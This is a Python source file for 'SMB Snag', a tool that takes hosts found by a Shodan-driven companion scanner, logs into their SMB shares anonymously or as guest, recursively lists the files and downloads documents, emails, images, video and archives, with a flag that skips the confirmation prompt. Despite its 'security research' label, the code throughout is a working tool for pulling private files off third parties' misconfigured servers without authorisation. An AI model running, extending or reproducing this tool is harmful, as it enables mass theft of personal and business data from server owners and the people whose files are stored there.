#!/usr/bin/env python3
"""
SMB Snag - File Collection Tool
Downloads files from SMB shares with weak authentication for security research
"""

import json
import csv
import time
import sys
import argparse
import uuid
import os
import subprocess
from datetime import datetime
from pathlib import Path
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.open import Open, CreateDisposition, ImpersonationLevel, FileAttributes, CreateOptions
from smbprotocol.exceptions import SMBException
import socket
from contextlib import redirect_stderr
from io import StringIO

# ANSI color codes
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BLUE = '\033[94m'
RESET = '\033[0m'

def load_configuration(config_file="config.json"):
    """Load configuration from JSON file with fallback to defaults."""
    default_config = {
        "shodan": {
            "api_key": "YOUR_API_KEY_HERE"
        },
        "connection": {
            "timeout": 30,
            "port_check_timeout": 10,
            "rate_limit_delay": 3,
            "share_access_delay": 7
        },
        "files": {
            "default_exclusion_file": "exclusion_list.txt"
        },
        "countries": {
            "US": "United States",
            "GB": "United Kingdom", 
            "CA": "Canada",
            "IE": "Ireland",
            "AU": "Australia",
            "NZ": "New Zealand",
            "ZA": "South Africa"
        },
        "file_collection": {
            "max_files_per_target": 3,
            "max_total_size_mb": 500,
            "download_delay_seconds": 2,
            "max_directory_depth": 3,
            "enumeration_timeout_seconds": 120,
            "included_extensions": [
                ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".rtf", ".csv",
                ".eml", ".msg", ".mbox", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
                ".mp4", ".mov", ".avi", ".mkv", ".wmv", ".mp3", ".wav", ".zip", ".rar"
            ],
            "excluded_extensions": [
                ".exe", ".dll", ".sys", ".bat", ".cmd", ".scr", ".com", ".pif", ".msi", 
                ".bin", ".log", ".tmp", ".temp", ".bak", ".old", ".swp", ".lock"
            ]
        }
    }
    
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            config = json.load(f)
        
        # Validate required sections exist
        required_sections = ["shodan", "connection", "files", "countries", "file_collection"]
        for section in required_sections:
            if section not in config:
                print(f"✗ Warning: Missing '{section}' section in {config_file}, using defaults")
                config[section] = default_config[section]
                
        return config
        
    except FileNotFoundError:
        print(f"✗ Configuration file {config_file} not found, using defaults")
        return default_config
    except json.JSONDecodeError as e:
        print(f"✗ Invalid JSON in {config_file}: {e}")
        print("✗ Using default configuration")
        return default_config
    except Exception as e:
        print(f"✗ Error loading configuration: {e}")
        print("✗ Using default configuration")  
        return default_config

class SMBSnag:
    def __init__(self, config, quiet=False, verbose=False, auto_download=False, no_colors=False, download_files=False):
        """Initialize the SMB file collection tool."""
        self.config = config
        self.quiet = quiet
        self.verbose = verbose
        self.auto_download = auto_download
        self.download_files = download_files
        
        # Color management
        if no_colors:
            self.GREEN = ''
            self.RED = ''
            self.YELLOW = ''
            self.CYAN = ''
            self.BLUE = ''
            self.RESET = ''
        else:
            self.GREEN = GREEN
            self.RED = RED
            self.YELLOW = YELLOW
            self.CYAN = CYAN
            self.BLUE = BLUE
            self.RESET = RESET
            
        # Collection statistics
        self.total_servers = 0
        self.current_server = 0
        self.total_files_downloaded = 0
        self.total_bytes_downloaded = 0
        self.collection_directories = []
        self.download_manifest = []
        
        # File extension filters
        self.included_extensions = [ext.lower() for ext in self.config["file_collection"]["included_extensions"]]
        self.excluded_extensions = [ext.lower() for ext in self.config["file_collection"]["excluded_extensions"]]
        
        # Configuration for enumeration
        self.max_depth = self.config["file_collection"].get("max_directory_depth", 3)
        self.enum_timeout = self.config["file_collection"].get("enumeration_timeout_seconds", 120)
        
    def print_if_not_quiet(self, message):
        """Print message unless in quiet mode."""
        if not self.quiet:
            print(message)
            
    def print_if_verbose(self, message):
        """Print message only in verbose mode."""
        if self.verbose and not self.quiet:
            print(message)
            
    def parse_auth_method(self, auth_method_str):
        """Parse authentication method string into username/password tuple."""
        auth_lower = auth_method_str.lower()
        if 'anonymous' in auth_lower:
            return "", ""
        elif 'guest/blank' in auth_lower:
            return "guest", ""
        elif 'guest/guest' in auth_lower:
            return "guest", "guest"
        else:
            # Default to anonymous if unclear
            return "", ""
            
    def should_include_file(self, filename):
        """Determine if file should be included based on extension filters."""
        file_path = Path(filename)
        extension = file_path.suffix.lower()
        
        # Check excluded extensions first
        if extension in self.excluded_extensions:
            return False
            
        # If included extensions list is provided, file must match
        if self.included_extensions:
            return extension in self.included_extensions
            
        # If no included list, allow anything not explicitly excluded
        return True
        
    def get_directory_listing(self, ip, share_name, username, password, max_files, max_size):
        """Get recursive directory listing from SMB share using smbclient with depth limiting."""
        files = []
        
        try:
            # Build smbclient command for recursive directory listing
            cmd = ["smbclient", f"//{ip}/{share_name}"]
            
            # Add authentication based on credentials
            if username == "" and password == "":
                cmd.append("-N")  # No password (anonymous)
            elif username == "guest":
                if password == "":
                    cmd.extend(["--user", "guest%"])
                else:
                    cmd.extend(["--user", f"guest%{password}"])
            else:
                cmd.extend(["--user", f"{username}%{password}"])
            
            # Add commands to list all files recursively
            cmd.extend(["-c", "recurse ON; ls"])
            
            self.print_if_verbose(f"    {self.CYAN}Listing files on {share_name}{self.RESET}")
            
            # Run command with configurable timeout
            result = subprocess.run(cmd, capture_output=True, text=True, 
                                  timeout=self.enum_timeout, stdin=subprocess.DEVNULL)
            
            if result.returncode != 0:
                self.print_if_verbose(f"    {self.YELLOW}⚠{self.RESET} smbclient error: {result.stderr.strip()}")
                return files
            
            # Parse smbclient output to extract file information with depth limiting
            current_dir = ""
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                # Track current directory
                if line.startswith('./'):
                    current_dir = line[2:].rstrip(':')
                    
                    # Check depth limit
                    if current_dir:
                        depth = current_dir.count('/') + current_dir.count('\\')
                        if depth >= self.max_depth:
                            self.print_if_verbose(f"      {self.YELLOW}⚠{self.RESET} Skipping depth {depth} directory: {current_dir}")
                            current_dir = "__SKIP__"  # Mark to skip files in this directory
                    continue
                    
                # Skip empty lines and headers
                if not line or 'blocks available' in line or line.startswith('Domain='):
                    continue
                    
                # Skip files if we're in a directory that exceeds depth limit
                if current_dir == "__SKIP__":
                    continue
                    
                # Parse file entries (format varies, but generally: name size date time)
                # Look for lines that aren't directories and have file information
                if not line.endswith('.') and not line.startswith('D'):
                    parts = line.split()
                    if len(parts) >= 4:
                        try:
                            # Try to extract filename and size
                            # smbclient format is roughly: filename size date time
                            filename = parts[0]
                            
                            # Skip if this looks like a directory or special entry
                            if filename in ['.', '..'] or filename.endswith('/'):
                                continue
                                
                            # Try to parse size (should be a number)
                            size = 0
                            for part in parts[1:]:
                                try:
                                    size = int(part)
                                    break
                                except ValueError:
                                    continue
                            
                            # Build full path
                            if current_dir:
                                full_path = f"{current_dir}\\{filename}"
                            else:
                                full_path = filename
                                
                            # Check file extension filter
                            if self.should_include_file(filename):
                                file_info = {
                                    'name': filename,
                                    'path': full_path,
                                    'size': size,
                                    'modified': time.time()  # Use current time as approximation
                                }
                                files.append(file_info)
                                
                                # Stop if we hit limits during discovery
                                if len(files) >= max_files * 2:  # Get extra files for sorting
                                    break
                                    
                        except (ValueError, IndexError):
                            # Skip malformed lines
                            continue
            
        except subprocess.TimeoutExpired:
            self.print_if_verbose(f"    {self.YELLOW}⚠{self.RESET} Timeout listing files on {share_name}")
        except Exception as e:
            self.print_if_verbose(f"    {self.YELLOW}⚠{self.RESET} Error listing files on {share_name}: {e}")
            
        return files
        
    def download_file(self, ip, share_name, username, password, remote_path, local_path):
        """Download a single file from SMB share using smbclient."""
        try:
            # Build smbclient command for file download
            cmd = ["smbclient", f"//{ip}/{share_name}"]
            
            # Add authentication based on credentials
            if username == "" and password == "":
                cmd.append("-N")  # No password (anonymous)
            elif username == "guest":
                if password == "":
                    cmd.extend(["--user", "guest%"])
                else:
                    cmd.extend(["--user", f"guest%{password}"])
            else:
                cmd.extend(["--user", f"{username}%{password}"])
            
            # Create local directory if needed
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            
            # Use smbclient to download the file
            # Convert Windows path to smbclient format
            smb_path = remote_path.replace('\\', '/')
            download_cmd = f'get "{smb_path}" "{local_path}"'
            cmd.extend(["-c", download_cmd])
            
            # Run command with timeout
            result = subprocess.run(cmd, capture_output=True, text=True, 
                                  timeout=60, stdin=subprocess.DEVNULL)
            
            if result.returncode == 0 and os.path.exists(local_path):
                return True
            else:
                self.print_if_verbose(f"    {self.YELLOW}⚠{self.RESET} smbclient download error: {result.stderr.strip()}")
                return False
                
        except subprocess.TimeoutExpired:
            self.print_if_verbose(f"    {self.YELLOW}⚠{self.RESET} Timeout downloading {remote_path}")
            return False
        except Exception as e:
            self.print_if_verbose(f"    {self.YELLOW}⚠{self.RESET} Error downloading {remote_path}: {e}")
            return False
            
    def collect_files_from_target(self, target_data):
        """Collect files from a single target IP."""
        ip = target_data['ip_address']
        country = target_data.get('country', 'Unknown')
        auth_method = target_data['auth_method']
        accessible_shares = target_data.get('accessible_shares', [])
        
        # Create directory for this IP
        date_str = datetime.now().strftime("%Y%m%d")
        target_dir = f"{date_str}-{ip}"
        
        if not accessible_shares:
            self.print_if_verbose(f"  {self.YELLOW}⚠{self.RESET} No accessible shares for {ip}")
            return target_dir, 0, 0
            
        # Parse authentication method
        username, password = self.parse_auth_method(auth_method)
        
        # Collection limits per target
        max_files = self.config["file_collection"]["max_files_per_target"]
        max_size_bytes = self.config["file_collection"]["max_total_size_mb"] * 1024 * 1024
        download_delay = self.config["file_collection"]["download_delay_seconds"]
        
        # Collect all files from all accessible shares
        all_files = []
        
        for share_name in accessible_shares:
            self.print_if_verbose(f"  {self.CYAN}📁{self.RESET} Scanning share: {share_name}")
            
            try:
                share_files = self.get_directory_listing(ip, share_name, username, password, max_files, max_size_bytes)
                
                # Add share name to each file (filtering already done in get_directory_listing)
                for file_info in share_files:
                    file_info['share_name'] = share_name
                    all_files.append(file_info)
                        
                self.print_if_verbose(f"    Found {len(share_files)} eligible files")
                
            except Exception as e:
                self.print_if_verbose(f"    {self.YELLOW}⚠{self.RESET} Error scanning share {share_name}: {e}")
                
        if not all_files:
            self.print_if_verbose(f"  {self.YELLOW}⚠{self.RESET} No eligible files found on {ip}")
            return target_dir, 0, 0
            
        # Sort files by modification time (most recent first)
        all_files.sort(key=lambda f: f['modified'], reverse=True)
        
        # Select files within limits
        selected_files = []
        total_size = 0
        
        for file_info in all_files:
            if len(selected_files) >= max_files:
                break
            if total_size + file_info['size'] > max_size_bytes:
                break
                
            selected_files.append(file_info)
            total_size += file_info['size']
            
        return target_dir, selected_files, total_size
        
    def process_json_input(self, json_file):
        """Process smb_peep JSON output file."""
        try:
            with open(json_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            targets = data.get('results', [])
            
            # Filter to only targets with accessible shares
            valid_targets = [t for t in targets if t.get('accessible_shares')]
            
            if not valid_targets:
                self.print_if_not_quiet(f"{self.RED}✗{self.RESET} No targets with accessible shares found in {json_file}")
                return []
                
            return valid_targets
            
        except Exception as e:
            self.print_if_not_quiet(f"{self.RED}✗{self.RESET} Error reading {json_file}: {e}")
            return []
            
    def run_collection(self, json_file):
        """Main collection process."""
        self.print_if_not_quiet(f"{self.CYAN}🔍{self.RESET} SMB Snag - File Collection Tool")
        self.print_if_not_quiet(f"{self.CYAN}📂{self.RESET} Processing: {json_file}")
        self.print_if_not_quiet(f"{self.BLUE}ℹ{self.RESET} Max directory depth: {self.max_depth} levels")
        self.print_if_not_quiet(f"{self.BLUE}ℹ{self.RESET} Enumeration timeout: {self.enum_timeout}s")
        
        # Load targets from JSON
        targets = self.process_json_input(json_file)
        if not targets:
            return
            
        self.total_servers = len(targets)
        self.print_if_not_quiet(f"{self.BLUE}ℹ{self.RESET} Found {self.total_servers} targets with accessible shares")
        
        # Phase 1: Generate file manifest
        self.print_if_not_quiet(f"{self.YELLOW}🔍{self.RESET} Generating file manifest...")
        
        collection_plan = []
        total_files_planned = 0
        total_size_planned = 0
        
        for target in targets:
            self.current_server += 1
            ip = target['ip_address']
            
            self.print_if_not_quiet(f"{self.CYAN}Server {self.current_server}/{self.total_servers}{self.RESET} - {ip}")
            
            target_dir, selected_files, target_size = self.collect_files_from_target(target)
            
            if selected_files:
                collection_plan.append({
                    'target': target,
                    'directory': target_dir,
                    'files': selected_files,
                    'total_size': target_size
                })
                
                total_files_planned += len(selected_files)
                total_size_planned += target_size
                
                size_mb = target_size / (1024 * 1024)
                self.print_if_not_quiet(f"  {self.GREEN}✓{self.RESET} {len(selected_files)} files ({size_mb:.1f}MB) planned for download")
            else:
                self.print_if_not_quiet(f"  {self.YELLOW}⚠{self.RESET} No eligible files found")
                
        # Generate and save manifest
        self.save_manifest(collection_plan, total_files_planned, total_size_planned)
        
        # Stop here if downloads not requested
        if not self.download_files:
            total_size_mb = total_size_planned / (1024 * 1024) if total_size_planned > 0 else 0
            self.print_if_not_quiet(f"\n{self.GREEN}📋{self.RESET} File manifest generated successfully")
            self.print_if_not_quiet(f"  Servers: {len(collection_plan)}")
            self.print_if_not_quiet(f"  Files: {total_files_planned}")
            self.print_if_not_quiet(f"  Total Size: {total_size_mb:.1f}MB")
            self.print_if_not_quiet(f"\n{self.YELLOW}💡{self.RESET} Use -d/--download-files flag to download files")
            return
            
        # Summary and confirmation for downloads
        if not collection_plan:
            self.print_if_not_quiet(f"{self.YELLOW}⚠{self.RESET} No files available for collection")
            return
            
        total_size_mb = total_size_planned / (1024 * 1024)
        self.print_if_not_quiet(f"\n{self.BLUE}📊 Download Summary:{self.RESET}")
        self.print_if_not_quiet(f"  Servers: {len(collection_plan)}")
        self.print_if_not_quiet(f"  Files: {total_files_planned}")
        self.print_if_not_quiet(f"  Total Size: {total_size_mb:.1f}MB")
        
        # Phase 2: File Downloads (if requested)
        # Confirmation prompt (unless auto-download is enabled)
        if not self.auto_download:
            response = input(f"\n{self.YELLOW}Will download {total_files_planned} files ({total_size_mb:.1f}MB total). Continue? [Y/n]: {self.RESET}")
            if response.lower().strip() in ['n', 'no']:
                self.print_if_not_quiet(f"{self.YELLOW}Download cancelled by user{self.RESET}")
                return
                
        # Execute downloads
        self.print_if_not_quiet(f"\n{self.GREEN}⬇{self.RESET} Starting file downloads...")
        
        server_count = 0
        for plan in collection_plan:
            server_count += 1
            target = plan['target']
            ip = target['ip_address']
            target_dir = plan['directory']
            files_to_download = plan['files']
            
            self.print_if_not_quiet(f"{self.CYAN}Server {server_count}/{len(collection_plan)}{self.RESET} - {ip}")
            
            # Create target directory
            os.makedirs(target_dir, exist_ok=True)
            self.collection_directories.append(os.path.abspath(target_dir))
            
            # Parse authentication
            username, password = self.parse_auth_method(target['auth_method'])
            
            # Download files
            file_count = 0
            downloaded_count = 0
            
            # Handle filename conflicts
            used_filenames = set()
            
            for file_info in files_to_download:
                file_count += 1
                share_name = file_info['share_name']
                remote_path = file_info['path']
                original_filename = file_info['name']
                
                # Create local filename with share prefix
                base_filename = f"{share_name}_{original_filename}"
                local_filename = base_filename
                
                # Handle naming conflicts
                counter = 1
                while local_filename in used_filenames:
                    name_parts = base_filename.rsplit('.', 1)
                    if len(name_parts) == 2:
                        local_filename = f"{name_parts[0]}_{counter}.{name_parts[1]}"
                    else:
                        local_filename = f"{base_filename}_{counter}"
                    counter += 1
                    
                used_filenames.add(local_filename)
                local_path = os.path.join(target_dir, local_filename)
                
                # Progress display
                if not self.quiet:
                    progress = f"Server {server_count}/{len(collection_plan)} Files {file_count}/{len(files_to_download)}"
                    print(f"  {progress} - {original_filename}", end='', flush=True)
                
                # Download file
                success = self.download_file(ip, share_name, username, password, remote_path, local_path)
                
                if success:
                    downloaded_count += 1
                    self.total_files_downloaded += 1
                    self.total_bytes_downloaded += file_info['size']
                    
                    # Log to manifest
                    self.download_manifest.append({
                        'ip': ip,
                        'share': share_name,
                        'remote_path': remote_path,
                        'local_path': os.path.abspath(local_path),
                        'size': file_info['size'],
                        'timestamp': datetime.now().isoformat()
                    })
                    
                    if not self.quiet:
                        print(f" {self.GREEN}✓{self.RESET}")
                else:
                    if not self.quiet:
                        print(f" {self.RED}✗{self.RESET}")
                
                # Rate limiting between downloads
                if file_count < len(files_to_download):
                    time.sleep(download_delay)
                    
            self.print_if_not_quiet(f"  {self.GREEN}✓{self.RESET} Downloaded {downloaded_count}/{len(files_to_download)} files from {ip}")
            
        # Final summary
        self.print_download_summary()
        
    def save_manifest(self, collection_plan, total_files, total_size):
        """Save file manifest to JSON file."""
        manifest_file = f"file_manifest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        # Build manifest structure
        manifest_data = {
            'metadata': {
                'tool': 'smb_snag',
                'manifest_date': datetime.now().isoformat(),
                'total_servers': len(collection_plan),
                'total_files': total_files,
                'total_size_bytes': total_size,
                'config': {
                    'max_directory_depth': self.max_depth,
                    'enumeration_timeout_seconds': self.enum_timeout,
                    'max_files_per_target': self.config["file_collection"]["max_files_per_target"],
                    'max_total_size_mb': self.config["file_collection"]["max_total_size_mb"]
                }
            },
            'servers': []
        }
        
        for plan in collection_plan:
            target = plan['target']
            server_info = {
                'ip_address': target['ip_address'],
                'country': target.get('country', 'Unknown'),
                'auth_method': target['auth_method'],
                'shares': []
            }
            
            # Group files by share
            shares_dict = {}
            for file_info in plan['files']:
                share_name = file_info['share_name']
                if share_name not in shares_dict:
                    shares_dict[share_name] = []
                shares_dict[share_name].append({
                    'name': file_info['name'],
                    'path': file_info['path'],
                    'size': file_info['size']
                })
            
            for share_name, files in shares_dict.items():
                server_info['shares'].append({
                    'share_name': share_name,
                    'file_count': len(files),
                    'total_size': sum(f['size'] for f in files),
                    'files': files
                })
            
            manifest_data['servers'].append(server_info)
        
        try:
            with open(manifest_file, 'w', encoding='utf-8') as f:
                json.dump(manifest_data, f, indent=2)
            self.print_if_not_quiet(f"  {self.GREEN}✓{self.RESET} Manifest saved: {manifest_file}")
        except Exception as e:
            self.print_if_not_quiet(f"  {self.RED}✗{self.RESET} Error saving manifest: {e}")
        
    def print_download_summary(self):
        """Print final download summary."""
        total_size_mb = self.total_bytes_downloaded / (1024 * 1024)
        
        self.print_if_not_quiet(f"\n{self.GREEN}🎯 Download Complete{self.RESET}")
        self.print_if_not_quiet(f"  Files Downloaded: {self.total_files_downloaded}")
        self.print_if_not_quiet(f"  Total Size: {total_size_mb:.1f}MB")
        self.print_if_not_quiet(f"  Directories Created: {len(self.collection_directories)}")
        
        if self.collection_directories:
            self.print_if_not_quiet(f"\n{self.BLUE}📁 Collection Directories:{self.RESET}")
            for directory in self.collection_directories:
                self.print_if_not_quiet(f"  {directory}")
                
        # Save manifest
        if self.download_manifest:
            manifest_file = f"download_manifest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            manifest_data = {
                'metadata': {
                    'tool': 'smb_snag',
                    'download_date': datetime.now().isoformat(),
                    'total_files': self.total_files_downloaded,
                    'total_size_bytes': self.total_bytes_downloaded,
                    'directories_created': self.collection_directories
                },
                'downloads': self.download_manifest
            }
            
            try:
                with open(manifest_file, 'w', encoding='utf-8') as f:
                    json.dump(manifest_data, f, indent=2)
                    
                self.print_if_not_quiet(f"\n{self.BLUE}📋{self.RESET} Download manifest saved: {manifest_file}")
                
            except Exception as e:
                self.print_if_not_quiet(f"{self.RED}✗{self.RESET} Error saving download manifest: {e}")

def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="SMB Snag - File Collection Tool for SMBSeek Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate file manifest only (default behavior)
  python3 smb_snag.py share_access_20250818_195333.json
  
  # Generate manifest and download files with confirmation
  python3 smb_snag.py -d share_access_results.json
  
  # Generate manifest and auto-download files (no confirmation)
  python3 smb_snag.py -d -a share_access_results.json
  
  # Verbose manifest generation
  python3 smb_snag.py -v share_access_results.json

This tool reads JSON output from smb_peep.py and generates a comprehensive
file manifest. Use -d flag to also download files from accessible shares.
        """
    )
    
    parser.add_argument('json_file', help='JSON file from smb_peep.py containing share access results')
    parser.add_argument('-q', '--quiet', action='store_true', help='Suppress output to screen')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-d', '--download-files', action='store_true', help='Download files (generates manifest only by default)')
    parser.add_argument('-a', '--auto-download', action='store_true', help='Skip confirmation prompt when downloading files')
    parser.add_argument('-x', '--no-colors', action='store_true', help='Disable colored output')
    
    args = parser.parse_args()
    
    # Validate input file
    if not os.path.exists(args.json_file):
        print(f"{RED}✗{RESET} File not found: {args.json_file}")
        sys.exit(1)
        
    # Load configuration
    config = load_configuration()
    
    # Initialize and run scanner
    snag = SMBSnag(config, 
                   quiet=args.quiet, 
                   verbose=args.verbose,
                   auto_download=args.auto_download,
                   no_colors=args.no_colors,
                   download_files=args.download_files)
    
    try:
        snag.run_collection(args.json_file)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Collection interrupted by user{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{RED}✗ Error during collection: {e}{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()